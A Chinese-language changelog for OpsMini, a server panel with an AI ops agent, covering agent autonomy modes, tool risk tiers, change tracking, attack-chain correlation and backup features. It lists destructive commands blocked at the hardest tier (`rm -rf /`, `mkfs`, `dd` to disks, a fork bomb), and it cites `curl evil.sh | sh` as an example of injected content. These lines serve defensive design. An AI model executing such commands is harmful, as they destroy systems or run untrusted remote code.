# 更新日誌

各版本變更記錄。

## v1.4.2（2026-11-09）

**移除內建日誌採集**，二進位檔從 50 MB 降到 38 MB。

- 內建的 Filebeat 相容採集端（logpipe）整體下線：任務目錄、處理器、ES / Kafka / Logstash 輸出，以及面板「日誌 → 採集管道」頁一併移除
- 透過 OpsAnt 納管並下發過採集任務的環境會停止採集；單機面板本來預設不採集，升級無感
- 舊 `config.yaml` 裡的 `logpipeline:` 段會被靜默忽略，無需手動刪除
- 內建告警規則「日誌管道積壓」會在首次啟動時自動清理，其未恢復事件一併置為已解決
- `/metrics` 不再輸出 `opsmini_log_*` 四個指標，Grafana 面板引用需同步移除
- 首次啟動會清理資料目錄下 `logs/` 的採集遺留（位點表、任務檔、磁碟佇列）
- 日誌檢視（面板日誌 / 系統日誌 / 即時 tail）不受影響

**修正從 OpsAnt 點進來時提示「sso login disabled」**

- 共用金鑰改為每次請求讀取：面板設定優先、`config.yaml` 作為後備，不再依賴啟動時的快照（預設設定下快照是空的）
- 身分驗證同時接受面板實例 ID 與主機名，與 OpsAnt 簽發的 payload 對齊
- 錯誤提示分層：開關未開 / 未設定金鑰 / 簽章不符 / 已過期 / 身分不符，不再一律回報「已關閉」

## v1.4.1（2026-11-06）

修補版。修三處日常會碰到的問題，另外給多機場景補上了識別主機的抓手。

**面板實例 ID（新）**

每台面板首次啟動產生 `opsmini-xxxxxxxxxxxx` 並持久化（資料庫為準，資料目錄留一份副本供腳本直讀），註冊到 OpsAnt 時一併上報。主機名重複、或經 NAT 撞了同一個出口 IP 時，靠它才能分清是哪一台。儀表板標題下直接顯示，點一下複製。

**接入 OpsAnt 支援測試連線（新）**

以前填完位址和 Token 只能儲存，對不對要等連線日誌。現在點「測試連線」會真實走一遍註冊流程（TCP 撥號 → gRPC 建流 → 註冊 → 等回執），失敗原因分三類：位址格式、網路不可達、Token 被拒。測試用一次性身分，不會踢掉正在運行的連線，也不儲存任何設定。

**終端環境變數（修正）**

面板由 systemd 系統服務啟動，systemd 不給這類服務設定 `HOME`，於是終端裡 `cd` 報 `HOME not set`，`~` 不展開，vim / git 靜默跳過 `~/.vimrc`、`~/.gitconfig`。現在按目前使用者從 `/etc/passwd` 補齊 `HOME`、`USER`、`LOGNAME`、`SHELL`、`PWD`。

**其他**

- `install.sh -n`（只列印不執行）不再顯示一個裝完就失效的初始密碼

## v1.4.0（2026-11-02）

**從「能處置」到「處置有據」**

v1.3 讓 Agent 學會自己發現問題、按邊界動手。v1.4 補的是另一面：**動手之前先搞清楚發生了什麼**，動手之後能說清做了什麼、能不能撤。

一句話概括這版：**主機上每一次修改都被記錄、被判斷、被關聯；每一個動作都被記賬、可回滾。**

**變更感知（新）**

運維排查最常見的一句話是「我不知道它上次好好的到現在發生了什麼」。這版把這句話堵上了。

- 六類變更來源常駐採集：配置檔案（逐行 diff）、軟體包、服務狀態、賬號許可權、防火牆規則、定時任務
- 歸因分三級並如實展示：`已確認`（能指到具體人）/ `推斷`（大概是誰）/ `未知`。不用「系統」兩個字糊過去
- 每條記錄帶前一條的雜湊，形成**防篡改鏈**，可隨時校驗；被刪改會斷在那一處
- diff 落庫前**脫敏**（`password=`、`api_key=`、私鑰塊）
- **規則複核**先用 0 token 打一道分（0–1，含三到五條理由）：高危路徑、操作者是否可確認、來源是否公網、是否非工作時段、同期是否有高危事件、是否由包管理器產生…… 判為可疑（≥0.55）才升級事件並喚醒 Agent
- Agent 拿到**原始 diff** 做深度分析，輸出「判定 / 依據 / 建議」，但**沒有任何寫許可權**
- 已知噪聲可以加**忽略規則**（支援 `**` 通配），命中後連事件都不產生
- 配置與賬號類變更保留原檔案快照，可從詳情頁直接回滾，失敗可再回滾回來

**攻擊鏈與處置事務（自主閉環收口）**

- **攻擊鏈**：把「WebShell 落地 → 可疑程序 → 外聯控制」串成一次入侵，五個環節、共享指標 + 時間鄰近打分（≥0.45 併入）。刻意收緊：單獨爆破不開鏈、指標與日誌暴漲永不入鏈、**變更只有在「判為可疑 + 改的是能扛過重啟的位置 + 鏈上已出現落地或外聯」三條同時成立時**才作為「持久化」環節併入
- **處置事務**：可逆動作（隔離/凍結/封禁/截斷/快照）在處置失敗時**逆序自動回滾**；不可逆動作明確列出「N 項無法撤銷」，不假裝撤回過。面板上可以手動回滾單條動作
- **影子覆盤**：影子模式跑過的處置，事後按事實判定 `would_help` / `unnecessary` / `unknown`——連續 `unnecessary` 說明閾值該收，連續 `would_help` 說明可以升到 assist
- **反饋抑制**：同一事件組 7 天內被忽略 2 次，後續不再喚醒 Agent（仍然記錄）
- **驗證失敗自動重試一次**，並把上次被攔的動作與驗證結果喂回給模型，避免重複同一個假設
- 變更頁與攻擊鏈**雙向可跳**；攻擊鏈的每個環節會標註來源（WebShell / 可疑程序 / 網路外聯 / 變更）

**事件降噪**

指標告警與日誌暴漲改成「只要事件沒被處置就一直摺疊」——一條 CPU 規則不再一晚上刷出八條待處置。登入異常視窗從 1 小時放寬到半天。事件被處置後再次發生照常新建，不會吞掉復發。

**日誌管道（新，預設關閉）**

內建一個**與 Filebeat 配置相容**的採集執行端，位置相當於被納管主機上的 filebeat，但不需要另裝程序。

- 任務目錄 `tasks.d`（一個任務一個 YAML），主配置 `main.yml` 決定出口；已有 filebeat 配置拆開就能用
- **31 個 Filebeat 處理器**：欄位增刪改、JSON/CSV/XML/syslog 解析、dissect、script、指紋、域名與網路方向
- 三種輸出：Elasticsearch、Kafka、Logstash（Lumberjack v2 + TLS）
- `at-least-once`：投遞成功後才推進 offset，失敗進磁碟佇列，崩潰後從確認位置重發
- **預設不採集任何日誌**：只有出現任務檔案、顯式開啟、或收到平臺下發任務時才啟動
- 面板「日誌 → 管道」可看執行狀態、每任務讀取速率、積壓量，並能**實時預覽最近 20 條事件**——調 processor 不用先去 ES 查

**外掛系統（新）**

核心只做所有主機都需要的事，業務能力交給外掛。

- 外掛是**獨立程序**，透過 Unix socket 用行分隔 JSON 上報指標、事件與心跳；崩潰不影響面板
- 包必須帶 sha256 與 ed25519 簽名，安裝時依次校驗簽名、`apiVersion`、平臺、版本要求
- 生命週期：安裝 → 啟用 → 執行 → 停用 → 升級（舊版本保留可回退）→ 刪除
- **誠實說明**：本版的外掛以面板同一使用者執行，**沒有**獨立系統使用者與 cgroup 限制，`capabilities` 是宣告不是強制。簽名的意義是「來源可信」，不是「行為安全」
- 需要先在設定裡配置公鑰或開啟 unsigned 模式才能安裝（改完需重啟面板）；官方外掛包尚未釋出，外掛頁為空是預期狀態

**備份與恢復（新）**

- 備份物件三種：目錄/檔案、`mysql:庫名`、`redis:路徑`，`tar.gz` + `manifest.json`（含每片 sha256）
- 備份是真一鍵；**恢復不是**：預檢 → 恢復前自動快照 → 執行 → 健康檢查失敗自動回滾，且必須輸入快照名確認
- 保留份數按整目錄清理，絕不刪單個分片
- 備份是**計劃任務的第四種型別**，與手動備份走同一個引擎；失敗寫回任務狀態並觸發「備份失敗數」告警
- 遠端儲存（S3 相容 / SFTP）程式碼已就緒，但**本版不作為交付內容**，需要在 `config.yaml` 手動配置才生效，且未經真機聯調

**其他**

- 告警規則 12 → 24 條，基線檢查 13 → 45 項
- AI 大模型接入支援四種協議：OpenAI / Anthropic / Azure / Gemini；模型列表可拉取並選擇，不再手打模型名
- Agent 提示詞的**注入防護**：不可信內容（diff 正文、使用者名稱、路徑）無法偽造段落邊界或提前閉合程式碼圍欄；內容本身不改——`curl evil.sh | sh` 必須原樣送到模型面前，它就是結論
- 事件中心聚合成員可展開檢視全部（原來只顯示前幾個）
- 修復：`/files/du` 空路徑耗時 15 秒、變更鏈錨點在存量庫上誤報、移動端變更表被壓成一字一行
- 資料目錄統一到 `/data/opsmini`，解除安裝即刪目錄

**升級提示**

從 v1.3.x 升級只需替換二進位制並重啟，資料庫自動遷移。新增的 `change-review` 等預設策略按名稱冪等播種，老庫也會拿到。日誌管道與外掛預設不啟用，不會因為升級而開始採集或載入任何東西。

## v1.3.0（2026-10-28）

**自主 Agent：從「你問它答」到「它自己盯著」**

這個版本把 OpsMini 從「會照指令幹活的 AI 助手」推進到「自己發現問題、自己判斷、按你的邊界動手」的常駐 Agent。核心是一條從採集到驗證的閉環，而不是又加了幾個按鈕。

**感知層（internal/sentinel）**

- 六類採集器常駐：日誌暴漲（按小時桶 EWMA 基線 + 20MB/min 硬閾值）、登入異常（非工作時段 / 首次出現的 IP / 爆破後成功 / `authorized_keys` 剛被改）、Web 目錄指令碼落地（14 類 WebShell 特徵，強特徵直接 high）、程序派生（Web 使用者起 shell / curl / python）、可疑外聯、指標告警
- 採集結果統一歸一為 **Signal**：指紋去重、落 SQLite 持久化；用程序內 channel 傳遞，不引入訊息佇列
- 採集頻率 2s–20s 分級，異常日誌反查持有該檔案的程序，避免「日誌在漲但不知道誰寫的」

**事件中心**

- 訊號按指紋與時間窗聚合成**事件**，一條事件帶標題、分類、等級、物件、發生次數
- 六個篩選（待處置 / 待喚醒 / 全部 / 已處置 / 失敗 / 已忽略）都帶計數，選中即顯示該狀態的口徑說明
- 事件詳情可下鑽到關聯訊號、Agent 執行記錄、逐條動作鏈（工具、引數、裁決、原始輸出）

**策略引擎（internal/trigger）**

- 五條內建策略開箱可用：`webshell-respond`、`auth-anomaly`、`proc-anomaly`（僅 critical）、`log-growth`（影子模式）、`net-anomaly`（預設關閉）
- 三個條件同時滿足才喚醒 Agent：分類匹配、等級達閾值、不在冷卻期；不滿足則只記錄事件，**不消耗模型額度**
- 每條策略可單獨配置預算：寫操作次數、模型步數、牆鍾時長、token 上限，任一超限即停
- 策略是資料不是程式碼：介面裡增刪改、調閾值、換模式，不用重啟

**三種執行模式**

- `shadow` 只觀察：照常取證、寫結論和「打算怎麼做」，一個寫操作都不執行，適合先跑幾天校準判斷
- `assist` 協助：只讀動作自動執行，任何寫動作停下來等人確認——日常推薦檔位
- `auto` 自主：僅 `auto_tools` 白名單裡的低危動作免確認，L2 以上永遠要人點頭

**不可逆動作可逆化**

- 刪除 → **隔離**：檔案移到隔離區，記錄原始路徑、校驗和、許可權，一鍵還原
- `kill -9` → **SIGSTOP 凍結**：先停住保留現場，確認後再決定
- 永久封禁 → **帶 TTL 的臨時封禁**：到期自動解封，誤封不會變成事故
- 動手前先**快照**：改配置前留底，驗證不透過可以回滾

**五道安全閘門（internal/safety）**

- 引數策略、寫預算、保護路徑、急停開關（killswitch）、處置後斷言驗證（`no_new_signal`、`port_listen`、`file_absent` 等）
- 驗證不透過的事件標記為失敗交回給人，而不是當成功糊過去；空報告同樣算失敗
- 每一次工具呼叫都進動作審計：誰觸發的、調了什麼、傳了什麼引數、返回了什麼

**資料保留**

- 面板設定新增「資料保留」頁：事件與訊號預設保留 30 天、動作審計 180 天，隔離項與封禁記錄 30 天
- 待處置事件連同其訊號與動作鏈**永不自動刪除**；隔離檔案在還原前不動，封禁在解封前不動
- 另加「清空事件歷史」：無視保留視窗一次清空（含隔離檔案副本與封禁記錄、解除防火牆規則、重置策略冷卻），二次確認後執行

**演練與驗證**

- 新增 `scripts/chaos-drill.sh`：注入四類故障（日誌暴漲 / WebShell 落地 / SSH 爆破成功 / Web 使用者派生 shell），再用 API 校驗感知層是否產出對應事件
- 在公網測試機上四場景全部透過；`auto` 模式下真實隔離 WebShell 並驗證透過

**其他改進**

- 登入頁文案改為 Agent 定位（7 語言），標籤頁標題跟隨登入狀態
- 通知卡片支援點選頁面空白處關閉
- 構建版本戳改用 `git describe --tags --dirty`，新增 `make release-check` 釋出預檢，避免帶髒工作區釋出

**升級說明**

- v1.2.1 → v1.3.0 直接替換二進位制重啟即可，新表自動建立，無需遷移
- 升級後建議先在「事件中心 → 策略」裡看一眼五條內建策略：預設都是 `assist` 或 `shadow`，不會自動改系統

## v1.2.1（2026-10-27）

**修正：移除 4 個跨邊界實作的多機 AI 工具**

v1.2.0 註冊了 `list_remote_hosts` / `remote_exec` / `remote_pull_file` / `remote_push_file` 四個多機工具，讓面板的 AI 透過 OpsMini Server 的控制面 HTTP 介面（4508）向其它納管主機派送命令與檔案。這個實作跨越了架構邊界，現已移除：

- 4508 是 OpsMini Server 提供給 OpsAnt 的**內部**介面，定位「僅本機 / 內網」，且不校驗權杖；
- 面板在多機鏈路中的角色是**被納管的 Agent**，只應透過 4507 的 gRPC 長連線與 Server 通訊（註冊、心跳、接收任務），不應反向呼叫控制面；
- 若要讓這個設計可用，就必須把 4508 對外開放 —— 等於掛出一個無認證的遠端命令執行入口。

工具集因此回到 **29 個**（16 唯讀 / 5 低風險寫入 / 8 高風險寫入）。多機編排與多機 AI 由 OpsAnt 承擔，它已有統一的執行 API（`/api/opsant/v1/tasks/run-shell/`、`tasks/run-script/`、`tasks/send-file/`、`tasks/get-minion-file/` 等）以及 salt / ansible / opsmini 三個執行引擎。

**升級無需遷移**：這 4 個工具在舊版本中依賴 4508 可達，實際上一直不可用。

## v1.2.0（2026-10-27）

**AI 智慧體（從「維運顧問」到「維運操作員」）**

- **自研輕量 ReAct 核心**：Reason → Act → Observe 閉環，不引入任何 Agent 框架，維持單一二進位與零 CGO；單輪預設 12 步上限，超過即停止呼叫工具並回報已知資訊
- **33 個內建工具**：唯讀 16 個（系統概觀 / 程序 / 連接埠 / 磁碟 / 目錄佔用 / 日誌檢索 / 服務 / 容器 / 安全等）、低風險寫入 5 個、高風險寫入 8 個，另有 4 個多機工具依 Agent 設定動態註冊
- **串流工具呼叫**：依 index 累積拼接 tool_calls 片段；對不支援串流工具呼叫的廠商自動降級為非串流重試
- **思考鏈視覺化**：前端逐步顯示「呼叫了什麼工具、帶了什麼參數、取得什麼原始輸出」，結論可稽核

**分級授權與人機協同**

- **四級風險模型**：L0 唯讀自主執行 / L1 低風險預設需確認（可依工具開放免確認）/ L2 高風險每次必確認且禁止免確認 / L3 災難性操作以正規表達式硬禁止
- **L3 於執行前攔截**：`rm -rf /`、`mkfs`、`dd of=/dev/sd*`、fork 炸彈、清空防火牆、覆寫 `/etc/passwd` 等，即使管理員核准也不會執行；另加兩條面板自我保護（禁止更動資料目錄、禁止關閉面板監聽埠）
- **中斷—恢復**：高風險呼叫會暫存並掛起，使用者在對話中核准或拒絕後，自 SQLite 恢復訊息序列繼續執行；拒絕路徑經實測確認無副作用

**雙向 MCP**

- **MCP 用戶端**：基於 MCP 官方 Go SDK，支援 stdio 與 Streamable HTTP 兩種傳輸，外部 MCP 服務的工具以 `mcp__<服務名>__<工具名>` 自動接入，每 2 分鐘對帳設定
- **MCP 伺服端**：將自身工具集發佈到 `/mcp`，以 Bearer 權杖驗證，預設僅下發 L0/L1 工具（L2 不對未授權用戶端暴露，因外部用戶端無法呈現面板確認視窗）

**排程 AI 任務**

- **計畫任務新增第四種類型「Agent 任務」**：填一段提示詞即可依 cron 自動執行，排程、啟停、上次執行時間、失敗告警全部沿用既有機制
- **無人值守授權降級**：排程執行時無人在旁按下「核准」，因此命中 L2 的工具直接拒絕並將原因回灌給模型，模型改用唯讀工具繼續完成，報告中註明「該操作需人工執行」並提供可複製的指令
- **可靠性與成本控制**：任務層級的步數上限與總逾時雙重限流；連續失敗 3 次自動停用任務，避免「每天失敗每天告警」；面板儲存即歸零失敗次數
- **內建 5 個巡檢預設**：主機巡檢 / 安全巡檢 / 磁碟空間 / 服務狀態 / 日誌異常，另有 4 個常用頻率預設

**單檔 HTML 報告**

- **報告即一個自包含 HTML 檔案**：樣式內嵌、無指令碼、無外部樣式表、無網路字型、無圖片，複製到隨身碟、當郵件附件、放靜態伺服器都能正常顯示
- **可開啟、可下載**：任務列表每列提供「開啟」（新分頁直接呈現）與「下載」兩個入口；中文檔名依 RFC 5987 編碼
- **歸檔至資料目錄**：`<資料目錄>/reports/<任務名>/` 下同時寫入 `.html` 與 `.md`，所有生成型功能統一依功能分子目錄
- **渲染安全**：報告正文混有主機資料（日誌片段、程序命令列、設定值），渲染器先整體 HTML 轉義再套用行內規則，僅放行 http/https/mailto 連結，日誌中的 `<script>` 只會顯示為文字；回應另附嚴格 CSP
- **需要 PDF 時**：於報告頁使用瀏覽器「列印 → 另存為 PDF」，樣式表已含列印規則

**通知與稽核**

- **共用通知器**：將原告警的通知分發抽成統一 `Notifier`（面板 / 郵件 / 企業微信 / 釘釘 / 飛書），AI 任務與告警行為完全一致；管道為空時預設發站內通知
- **稽核留痕**：AI 工具呼叫寫入稽核日誌，無人值守被拒絕的操作記為 `unattended-deny`，人工拒絕記 `reject:` 前綴

**其他改進**

- 側邊欄版本號改為顯示後端真實版本（原為寫死值）
- 新增 `docs/ai-agent.md` 等 7 語言設計文件
- Agent 任務建議由管理員在「AI 助手 → 工具權限」中依需求調整各工具策略；高風險工具始終鎖定為「需確認」

## v1.1.0（2026-09-21）

**多機管理（Agent / Server 架構）**

- **Agent gRPC 客戶端**：Agent 主動連 OpsMini Server（單埠 gRPC 雙向流），心跳 + 指數退避重連，接收執行 / 檔案任務並回傳結果
- **OpsMini Server 端**：註冊 / 心跳 / 連線管理、執行任務下發、結果接收（程式碼遷至 OpsAnt 專案獨立 Go 子專案 `opsmini-server/`，OpsMini 僅保留 Agent）

- **檔案拉取（PullFile）**：Server 從 Agent 拉取檔案（分片上傳 + size / md5 校驗）
- **檔案下發（PushFile）**：Server 向 Agent 下發檔案（分片 + 斷點續傳 + md5 校驗），支援目標為目錄（保留原檔名）
- **連線狀態檢測 + 長連線保活**：Agent 線上 / 離線狀態、心跳超時判定、gRPC keepalive
- **接入 OpsAnt**：面板「設定」頁視覺化配置 OpsAnt 地址 / Token（執行時熱切換，Token 顯示支援眼睛切換明文 / 密文），SSO 免認證跳轉（預設開啟）
- **移除 `/agent/v1` REST API**：改用 gRPC 雙向流（原 REST API 及前端「API Token」設定頁一併移除）

- **檔案頁長名稱最佳化**：超長檔案 / 目錄名省略顯示，懸停檢視完整名（消除橫向捲軸）
- **系統管理「網路」路由表**：網卡下方新增路由表展示（目標網路 / 閘道 / 子網掩碼 / 標誌 / 介面 / 度量）
